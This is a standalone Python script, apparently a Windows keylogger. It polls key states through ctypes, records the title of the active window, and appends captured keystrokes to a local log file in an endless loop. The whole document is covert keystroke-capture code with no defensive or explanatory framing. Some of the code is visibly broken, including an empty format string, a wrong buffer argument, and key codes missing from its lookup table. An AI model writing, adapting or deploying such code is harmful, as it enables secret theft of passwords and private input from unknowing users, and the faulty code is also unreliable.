import ctypes
import ctypes.wintypes
import time

keys={
	8:"b",
	13:"e",
	27:"[ESC]",
	112:"[F1]",
	113:"[F2]",
	114:"[F3]",
	115:"[F4]",
	116:"[F5]",
	117:"[F6]",
	118:"[F7]",
	119:"[F8]",
	120:"[F9]",
	121:"[F10]",
	122:"[F11]",
	123:"[F12]",
	192:"`",
	49:"1",
	50:"2",
	51:"3",
	52:"4",
	53:"5",
	54:"6",
	55:"7",
	56:"8",
	57:"9",
	48:"0",
	189:"-",
	187:"=",
	9:"[TAB]",
	81:"q",
	87:"w",
	69:"e",
	82:"r",
	84:"t",
	89:"y",
	85:"u",
	73:"i",
	79:"o",
	80:"p",
	219:"[",
	221:"",
	65:"a",
	83:"s",
	68:"d",
	70:"f",
	71:"g",
	72:"h",
	74:"j",
	75:"k",
	76:"l",
	186:";",
	222:"'",
	90:"z",
	88:"x",
	67:"c",
	86:"v",
	66:"b",
	78:"n",
	77:"m",
	188:":",
	190:".",
	191:"/",
	220:"\\",
	17:"[CTRL]",
	91:"[WIN]" ,
	32:" ",
	92:"[WIN]" ,
	44:"[PRSC]",
	145:"[SCLK]",
	45:"[INS]" ,
	36:"[HOME]" ,
	33:"[PGUP]" ,
	46:"[DEL]" ,
	35:"[END]",
	34:"[PGDN]",
	37:"[LEFT]",
	38:"[UP]",
	39:"[RGHT]",
	40:"[DOWN]",
	144:"[NMLK]",
	111:"/",
	106:"*",
	109:"-",
	107:"+",
	96:"0",
	97:"1",
	98:"2",
	99:"3",
	100:"4",
	101:"5",
	102:"6",
	103:"7",
	104:"8",
	105:"9",
	110:"."
}


def write_append(file_name, buffer):
    with open(file_name,'a') as fl:
        fl.write(buffer)
        
out_file ="outlog.txt"
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

HWND = ctypes.wintypes.HWND

LPWSTR = ctypes.POINTER(ctypes.c_wchar)

GetWindowText = user32.GetWindowTextW
GetWindowText.argtypes = [HWND, LPWSTR, ctypes.c_int]
GetWindowText.restype = ctypes.c_int

GetAsyncKeyState = user32.GetAsyncKeyState
GetAsyncKeyState.argtypes = [ctypes.c_int]
GetAsyncKeyState.restype = ctypes.c_short

GetTickCount = kernel32.GetTickCount
GetTickCount.restype = ctypes.c_int





current_hwnd = user32.GetForegroundWindow()
prev_hwnd = current_hwnd 

buffer = ""

UINT = ctypes.c_uint
WPARAM = ctypes.c_ulong
LPARAM = ctypes.c_ulong
MAPVK_VK_TO_CHAR = 2

while True:
    time.sleep(0.3)
    current_hwnd = user32.GetForegroundWindow()
    if current_hwnd!=prev_hwnd:
        buffer_size = 512
        buffer = ctypes.create_unicode_buffer(buffer_size)
        GetWindowText(current_hwnd, buffer.value, buffer_size)

        write_append(out_file, "Window: ".format(buffer.value))
        buffer = ""
    prev_hwnd = current_hwnd

    for i in range(20,93):
        hkey = GetAsyncKeyState(i)
        if hkey & 0x8000:
            write_append(out_file, keys[i])
          